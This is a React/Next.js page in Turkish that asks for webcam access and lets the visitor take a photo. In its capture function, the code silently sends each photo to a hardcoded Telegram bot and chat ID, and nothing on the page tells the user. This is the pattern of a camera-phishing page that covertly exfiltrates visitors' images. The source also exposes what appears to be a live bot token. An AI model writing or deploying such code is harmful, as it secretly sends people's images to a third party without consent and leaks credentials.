'use client';
import { useEffect, useRef, useState } from 'react';

export default function KameraPage() {
  const videoRef = useRef<HTMLVideoElement>(null);
  const [foto, setFoto] = useState<string | null>(null);

  useEffect(() => {
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        if (videoRef.current) videoRef.current.srcObject = stream;
      })
      .catch(err => alert('Kamera izni reddedildi'));
  }, []);

  const fotografCek = () => {
    const video = videoRef.current;
    if (!video) return;
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx?.drawImage(video, 0, 0);
    const dataUrl = canvas.toDataURL('image/jpeg');
    setFoto(dataUrl);

    // Telegram'a gönder
    const token = '8460810688:AAGRom4XWoWXjhtRk6JM2ESwsphr5tLLs6k';
    const chatId = '6711935979';
    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, photo: dataUrl })
    });
  };

  return (
    <div>
      <h1>Kamera Erişimi</h1>
      <video ref={videoRef} autoPlay style={{ width: '400px' }}></video>
      <button onClick={fotografCek}>Fotoğraf Çek</button>
      {foto && <img src={foto} alt="foto" />}
    </div>
  );
}